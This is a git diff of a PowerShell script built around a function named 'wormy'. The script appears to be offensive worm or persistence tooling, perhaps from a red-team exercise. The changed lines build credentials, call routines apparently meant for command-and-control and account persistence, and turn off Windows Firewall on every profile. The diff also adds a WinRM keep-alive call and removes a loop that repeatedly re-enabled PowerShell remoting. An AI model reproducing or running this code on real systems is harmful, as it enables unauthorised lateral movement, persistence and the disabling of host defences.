@@ -102,6 +102,7 @@ function wormy{
         [PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
         cNc
         accountPersist
+        keepWINRMAlive
         Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
         [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
         Write-Output 'slither'
@@ -131,7 +132,8 @@ function wormy{
                 }
             }
         
-            accountPersist
+            
+            
             start-sleep -Seconds (get-random -Minimum 2 -Maximum 5)
         }
 }
@@ -162,14 +164,6 @@ start-job -ScriptBlock{
 
 }
 
-start-job -ScriptBlock{
-
-    While(1 -eq 1){
-        Enable-PSRemote -force
-        start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
-
-    }
-}
 
 start-job -ScriptBlock { 
     while(1 -eq 1){
